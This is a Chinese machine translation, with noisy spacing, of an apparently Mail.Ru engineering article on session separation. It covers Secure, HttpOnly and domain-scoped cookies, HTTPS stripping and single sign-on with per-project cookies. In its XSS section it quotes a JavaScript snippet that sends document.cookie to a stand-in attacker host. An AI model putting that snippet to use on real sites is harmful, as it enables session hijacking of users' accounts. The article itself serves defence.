<html>
<head>
<title>Divide and Govern: How We Implemented Session Separation at Mail.Ru portal</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">分而治之:我们如何在邮件中实现会话分离。Ru门户</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/divide-and-govern-how-we-implemented-session-separation-at-mail-ru-portal-ea5619ed12ef?source=collection_archive---------26-----------------------#2018-04-02">https://medium.com/hackernoon/divide-and-govern-how-we-implemented-session-separation-at-mail-ru-portal-ea5619ed12ef?source=collection_archive---------26-----------------------#2018-04-02</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><figure class="fi fk is it iu iv fe ff paragraph-image"><div class="fe ff ir"><img src="../Images/c3ba07cf5c68e1d951276e3b2f0253ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*ziPc6KPOeZxSKR8_xcziKg.png"/></div></figure><p id="7ab4" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di">在</span> <strong class="ja hv">开头……</strong></p><p id="bc0d" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">邮件。Ru是一个巨大的门户网站，创建于15年前。从那时起，我们已经从一个小的网络项目发展成为访问量最大的Runet网站。门户包含大量的服务，每个服务都有自己的故事和独立的开发团队，他们必须尽最大努力确保所有项目(新的、旧的和随着门户的发展而加入的项目)共享一个用户认证系统。多年后，我们最终面临一个几乎相反的任务:独立的用户会话。为什么这是必要的，什么障碍绊倒了我们，我们如何绕过他们将在这篇文章中讨论。<br/> <br/>如果我们回到过去，我们所有的服务都是一个二级域的一部分，并被分成三级域，那么引入通用授权似乎是一个微不足道的问题。为了完成这项任务，我们简单地选择了经典的(当时的)方法:我们引入了一个在所有可用资源之间共享的单一身份验证表单，在二级域上设置一个身份验证cookie，并开始在服务器端验证传输的cookie。美观、简洁、实用:<br/><br/><em class="kf">Set-Cookie:Mpop = 1406885629:FBD 9 c 78 CDB 2c 08634 e 0977 fa 1 b 9 e 6 c 6 c:user @ mail . ru:；domain=.mail.ru </em>然而，时代在变…</p><p id="166e" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di">师</span>师<strong class="ja hv">何敌不眠</strong></p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff kg"><img src="../Images/497b0249e7b56c0acdcf9d7f21f74f71.png" data-original-src="https://miro.medium.com/v2/resize:fit:514/format:webp/1*-Q-KfI6MsgK-4OgU9Cc5pA.png"/></div></figure><p id="1743" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">随着我们公司的成长，用户账户成了各种不法分子渴望的猎物。先来的只是用蛮力。这些入侵者什么也没做，只是强行输入用户密码，搜索那些记得自己出生日期或宠物名字的人。<br/> <br/>不久之后，网络钓鱼者紧随其后，向门户网站用户发送与他们从Mail.Ru收到的电子邮件类似的电子邮件。这些邮件中要么包含伪装成门户网站身份验证点的站点链接，要么使用其他方法从用户处骗取密码。</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff kl"><img src="../Images/ff873c26b0013e0fdab51caacdaab9fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:414/format:webp/1*jMOWNpcHNfPKav6qJ1Abiw.png"/></div></figure><p id="a4be" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated"><strong class="ja hv">我们也不睡觉</strong></p><p id="6327" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">为了打击网络钓鱼者和暴力破解者，反垃圾邮件和安全团队被召集起来采取行动。技术和用户教育最终取得了成果，安全漏洞大大减少。(尽管弱密码和人类的易受骗性是我们今天谈论的帮助黑客的主要因素——但那是另一篇文章了，伙计们。过了一会儿，这项业务开始真正赚钱，鲨鱼也加入了这个小圈子，他们中的一些人寻找网络服务中的漏洞，并利用这些漏洞获取用户账户。雪上加霜的是，他们还找到了监听用户电脑和我们服务之间流量的方法。所有这些非法活动的目标都是用户认证会话——换句话说，就是门户的认证cookie。</p><p id="28bc" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di"/><strong class="ja hv">HTTPS一直是HTTPS吗？</strong></p><p id="abb7" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">我们将对用户数据安全至关重要的服务，例如邮件或云，隐藏在<a class="ae km" href="https://hackernoon.com/tagged/https" rel="noopener ugc nofollow" target="_blank"> HTTPS </a>之后。当时，使用安全的HTTPS连接协议似乎是我们问题的解决方案。通过这种连接传输的数据经过加密和签名，因此第三方无法读取或更改它们。</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff kn"><img src="../Images/f030cc319187f4717719660e29c169d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*XZCcONr6HRivkkSbvuctGA.png"/></div><figcaption class="ko kp fg fe ff kq kr bd b be z ek">Plaintext transmission</figcaption></figure><p id="cfa3" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">但是，如果位于服务器和浏览器之间的黑客通过不安全的协议强迫用户的浏览器访问门户网站，会发生什么呢？要做到这一点，只需拦截以非加密形式发送给用户的任何HTTP响应，并向其中添加一个带有正确地址的图像:</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff ks"><img src="../Images/d9468a8d2f42752f3ea6a32dcc939496.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*w_rXrzLYxQn3PkCLG6R1og.png"/></div><figcaption class="ko kp fg fe ff kq kr bd b be z ek">HTTPS stripping attack</figcaption></figure><p id="8f19" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">黑客因此迫使用户的浏览器通过不安全的连接访问门户。如图所示，session_id cookie通过非加密连接自动发送到门户服务器，毫无疑问，黑客很容易就能拦截它。之后，他们可以像知道实际密码一样轻松地使用该帐户。为了防止这种情况，服务器可以将cookie标记为安全的。它会通知浏览器，只有当连接使用HTTPS协议时，cookie才应该发送到服务器。cookie标记如下:<br/><br/><em class="kf">HTTP/1.1 200 OK<br/>Content-type:text/html<br/>Set-Cookie:session _ id = c 9 AAF 792 b 29 AFC 98 fc 12 CD 613 e 5330 b 6；安全</em> <br/> <br/>这是在服务器上配置HTTPS时需要考虑的重要一点:为认证cookies设置安全标志对于现代web服务来说是绝对必要的。如果你有一个大的门户网站，那就更是如此。如果存在集中式身份验证，那么对门户域中的服务使用HTTP为任何试图绕过HTTPS的人开了绿灯。然而，即使一切都在HTTPS之后，并能抵御流量拦截，仍然存在利用web服务漏洞的风险，例如XSS。这迫使公司要么完全放弃通用认证，要么选择另一种方式(我们将在后面讨论)。</p><p id="bd0d" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">另一个对HTTPS剥离攻击的保护是HSTS与HSTS预载，它要求所有子域支持HTTPS，这是一个不同的故事。</p><p id="ddc4" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di"> X </span></p><p id="72ee" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">根据俄罗斯维基百科文章的翻译，“跨站脚本(或XSS)可能被用于绕过访问控制或窃取用户凭证等”。当攻击者利用XSS漏洞时，在大多数情况下，身份验证cookie是他们想要的，他们可以用它来访问用户的帐户。为了劫持用户会话，黑客通常使用类似于以下代码的JS代码:</p><p id="146a" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated"><strong class="ja hv"><em class="kf">var</em></strong><em class="kf">іmg =</em><strong class="ja hv"><em class="kf">new</em></strong><em class="kf">image()；</em></p><p id="659c" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">іmg.src = ' http://hacker . site/XSS-sniffer . PHP？'+document . cookie；</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff ir"><img src="../Images/6e5fa18bc4669adeea42ccac41427f88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*8h8J3SmvO81WU5pIiqewbg.png"/></div></figure><p id="4ece" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">毫无疑问，处理XSS错误的最重要和最有效的方法是通过测试、开发人员培训、代码审查和安全审计来防止错误的产生。然而，当有许多项目由不同的人员配备良好的团队工作时，不可能有绝对无错的代码。我们的主要目标是保护用户账户；我们必须确保它们是安全的，不管系统是否有XSS漏洞，或者是否有人试图利用它们。HttpOnly cookies来拯救我们了。HttpOnly cookies不可能用JavaScript读取，但是它们仍然可以像任何其他cookie一样被服务器脚本访问。尽管事实上这种技术并不新颖(例如微软在8年前在IE6 SP1推出了HttpOnly cookies)，但并不是每个人都知道为什么尽可能使用它们是值得的。JS无法访问的cookie是计划XSS攻击的邪恶分子的第二道防线，因为在页面上偷偷摸摸的恶意代码将无法使用document.cookie窃取用户cookie。此外，在cookie中使用HttpOnly标志有助于保护用户帐户免受不受信任的脚本、横幅或计数器的影响，这些脚本、横幅或计数器可能会从公司无法控制的资源中加载。<br/> <br/>天底下没有十全十美的事情，HttpOnly cookies也不是万灵药:HttpOnly标志并不能提供对XSS漏洞的完全保护。但是，它不允许JS代码劫持身份验证会话，从而极大地缩小了其被利用的可能性。但是也有不能用的情况。例如，当闪光灯被频繁使用时。然而，这还不足以成为完全放弃HttpOnly cookies的理由。您可以通过结合使用这两种类型的cookies并尽可能只使用HttpOnly来将风险降至最低。现在我们已经为cookies添加了Secure和HttpOnly标志——还需要做什么呢？</p><p id="e604" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di">D</span>T8】特定于域的cookie</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff kt"><img src="../Images/73c9e0d5a9e284d617b365296a943628.png" data-original-src="https://miro.medium.com/v2/resize:fit:684/format:webp/1*fvRSD1utKkxW1VdT5Uj1eg.png"/></div></figure><p id="8d80" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">您可能还记得，为了确保我们公司所有服务的端到端身份验证，我们过去在二级域中使用单一身份验证cookie集。一个通用的身份验证cookie不仅仅是方便用户；这也是一种通过公司任何项目代码中的一个漏洞就能同时访问所有服务的方法。因此，通过从<em class="kf">a-site-with-common-authentication.example.com</em>服务中窃取认证cookie，我们获得了对【b-site-with-common-authentication.example.com】T2的访问权。<br/> <br/>流量嗅探的工作方式类似，除非使用安全cookies。如果一个公司的服务是安全的，并且使用HTTPS，而另一个使用HTTP，那么您所要做的就是指示浏览器调用不太安全的服务，窃取身份验证cookie，并将其用于安全服务中的身份验证。<br/> <br/>现在为了解决这个问题，添加了带有<em class="kf">域</em>属性的Cookie:<br/><br/><em class="kf">HTTP/1.1 200 OK<br/>Content-type:text/html<br/>Set-Cookie:session _ id = c 9 AAF 792 b 29 AFC 98 fc 12 CD 613 e 5330 b 6；domain = a . example . com；安全</em> <br/> <br/>浏览器现在将仅发送此cookie来响应对a.company.com域及其子域的查询。当使用特定于域的cookies时，如果任何一个服务有漏洞，它将是唯一受到攻击的服务。对于XSS和其他漏洞来说都是如此。</p><p id="067e" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt jw translated"><span class="l jx jy jz bm ka kb kc kd ke di">W</span>T20】说唱起来</p><p id="fdb5" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">因此，我们将最关键的服务转移到了HTTPS，引入了特定领域的cookies，搜索并消除了漏洞，并试图从各个角度保护我们自己和我们的用户。但是，如果仍然提供单一身份验证呢？为了在HTTP和HTTPS共存的多样化环境中做到这一点，我们引入了额外的特定于域的cookies作为每个项目的额外安全措施。除了遗留的主身份验证cookie (Mpop)之外，还为项目的域设置了一个附加的cookie (sdc)。只有当两个cookie(Mpop和域内sdc cookie)都存在时，用户身份验证才有效。</p><figure class="kh ki kj kk fq iv fe ff paragraph-image"><div class="fe ff ku"><img src="../Images/2d714a101e33c5f190a28feb0a47640e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*aoKS36etShPQPt2CWoNXpA.png"/></div><figcaption class="ko kp fg fe ff kq kr bd b be z ek">SDC (Secure Domain Cookie) authentication process on project page</figcaption></figure><p id="c462" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">邮件中的会话分离机制。Ru的工作方式如下:用户身份验证总是通过单点登录auth.mail.ru进行，它需要一个登录名和密码(可能还有第二个因素),并发出一个带有安全和HttpOnly标志的域cookie .auth.mail.ru。没有一个项目可以访问用户的登录名和密码。任何项目都无法使用. auth.mail.ru cookie。<br/> <br/>当用户访问他尚未登录的项目站点时，他的请求将被转发到认证点，认证点通过. auth.mail.ru cookie对他进行认证，生成一次性令牌并使用该令牌重定向到项目的监听器页面。项目的侦听器将令牌代理到身份验证点，身份验证点使用令牌生成项目cookie，这一次是针对. project.mail.ru。这样，您就保留了门户单一身份验证的所有优势，并以对用户透明的方式提供了对不同资源的单独身份验证访问。<br/>访问分离使我们能够以更一致的方式保护我们的资源，而不仅仅依赖于“外部电路”——即使攻击者设法劫持其中一个资源上的会话或以其他方式破坏它，用户遭受的损害也将是最小的。除了单独的会话，还有其他对用户不可见的单独访问技术(这很酷！).但是我们将在另一篇文章中讨论这个问题。<br/> <br/>总的来说，我们可以得出结论，即使是联合在一个公共平台上的服务也必须(在引擎盖下)分道扬镳，我们目前正在自己的门户上应用这种方法。我们确信，俄罗斯的其他公司很快也会效仿，相当一部分网络犯罪分子会发现自己突然失业了。</p><p id="184b" class="pw-post-body-paragraph iy iz hu ja b jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv hn dt translated">敌人不得通过！</p><ul class=""><li id="6408" class="kv kw hu ja b jb jc jf jg jj kx jn ky jr kz jv la lb lc ld dt translated"><em class="kf"> *本文原载</em> <a class="ae km" href="https://habrahabr.ru/company/mailru/blog/228997/" rel="noopener ugc nofollow" target="_blank"> <em class="kf">于2014年8月04日俄文版</em> </a> <em class="kf">。</em></li></ul><figure class="kh ki kj kk fq iv"><div class="bz el l di"><div class="le lf l"/></div></figure></div></div>    
</body>
</html>